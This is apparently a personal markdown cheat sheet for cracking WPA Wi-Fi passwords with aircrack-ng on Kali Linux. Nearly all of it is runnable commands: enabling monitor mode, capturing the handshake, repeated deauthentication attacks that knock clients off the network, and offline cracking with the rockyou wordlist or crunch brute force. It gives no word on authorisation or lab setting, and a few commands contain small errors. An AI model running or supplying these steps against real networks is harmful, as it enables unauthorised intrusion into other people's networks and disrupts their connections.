### A. Start General Info
1. **Switch to Super User:**
   ```bash
   sudo su
   ```
2. **Check Network Configuration:**
   ```bash
   iwconfig
   # Ensure the network is in Mode:managed
   ```
3. **Check Running Processes:**
   ```bash
   airmon-ng check
   ```
4. **Kill Current Processes:**
   ```bash
   airmon-ng check kill
   # Rechecking will show nothing this time
   ```

### B. Change Manager Mode to Monitor Mode
1. **Start Monitor Mode:**
   ```bash
   airmon-ng start wlan0
   # wlan0 can vary, e.g., wlan0mon
   ```

### C. Gather Basic Info
1. **Capture Basic Network Info:**
   ```bash
   airodump-ng wlan0
   # Stop the process after 10-15 seconds
   ```
2. **Create a Text Note:**
   ```txt
   BSSID:
   CH (channel):
   ESSID:
   ```

### D. Dump the Capture File
1. **Folder Structure:**
   ```
   -|New_Folder
      |- Captured_Files
      |- rockyou
   ```
2. **Capture Handshake:**
   ```bash
   # Inside "Captured_Files" folder, do `sudo su` & use
   airodump-ng wlan0 -d <bssid>
   # Keep this process running
   ```
3. **De-authenticate Clients:**
   ```bash
   # In the same folder, open another terminal
   aireplay-ng --deauth 0 -a <bssid> wlan0
   # Close after 20 seconds
   ```
4. **Capture Files:**
   ```bash
   airodump-ng -w file_name -c <ch> --bssid <bssid> wlan0
   # Close after 20 seconds
   ```
5. **Re-run De-auth and Capture:**
   ```bash
   aireplay-ng --deauth 0 -a <bssid> wlan0
   # Close after 20 seconds
   airodump-ng -w file_name -c <ch> --bssid <bssid> wlan0
   # Close after 20 seconds
   ```
6. **Check Captured Files:**
   ```bash
   ls
   # Check the files in "Captured_Files" folder
   # Visible formats: csv, netxml, cap
   ```

### E. Dictionary Attack (Method One)
1. **Download and Extract `rockyou.txt`:**
   ```
   -|New_Folder
      |- Captured_Files
      |- rockyou (extract it & paste the `rockyou.txt` file here)
   ```
2. **Optional: Use Built-in `rockyou` File from Kali Linux:**
   ```bash
   gunzip -c /usr/share/wordlists/rockyou.txt.gz > ~/Desktop/New_Folder/rockyou/rockyou.txt
   ```
3. **Change Permissions and Run Aircrack-ng:**
   ```bash
   chmod 777 ~/Desktop/New_Folder/rockyou/rockyou.txt
   aircrack-ng file_name.cap -w /Desktop/New_Folder/rockyou/rockyou.txt
   ```

### F. Brute Force Attack (Method Two)
1. **Generate Passwords and Run Aircrack-ng:**
   ```bash
   crunch 8 12 pbcedfeg | aircrack-ng file_name.cap -b <bssid> -w-
   ```

## Post process  
```bash
# After all things done, do this before shutting OS
airmon-ng Stop wlan0
``` 